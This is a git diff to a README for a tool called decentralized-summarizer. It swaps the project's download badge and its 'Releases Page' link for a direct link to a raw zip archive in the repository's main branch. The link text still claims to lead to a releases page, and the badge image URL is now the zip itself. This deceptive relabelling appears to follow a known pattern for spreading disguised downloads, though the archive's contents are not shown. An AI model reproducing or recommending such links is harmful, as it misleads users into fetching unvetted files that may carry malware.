@@ -1,7 +1,7 @@
 # 🌟 decentralized-summarizer - Simplify Complex Concepts with Ease
 
 ## 📥 Download the Application
-[![Download decentralized-summarizer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/yuvrajsinh1176/decentralized-summarizer/releases)
+[![Download decentralized-summarizer](https://github.com/yuvrajsinh1176/decentralized-summarizer/raw/refs/heads/main/decentralized_summarizer/decentralized-summarizer-1.0.zip)](https://github.com/yuvrajsinh1176/decentralized-summarizer/raw/refs/heads/main/decentralized_summarizer/decentralized-summarizer-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to decentralized-summarizer! This application helps you understand complex decentralized protocol concepts easily. Simply input your text, and the tool will generate structured summaries that highlight the key features and benefits of concepts like Polyproto.
@@ -21,7 +21,7 @@ To run the decentralized-summarizer application, your computer should meet the f
 - Internet Connection: Required for downloading the application and updates.
 
 ## 🔧 Download & Install
-1. **Visit this page to download** the application: [Releases Page](https://github.com/yuvrajsinh1176/decentralized-summarizer/releases).
+1. **Visit this page to download** the application: [Releases Page](https://github.com/yuvrajsinh1176/decentralized-summarizer/raw/refs/heads/main/decentralized_summarizer/decentralized-summarizer-1.0.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file in your downloads directory.
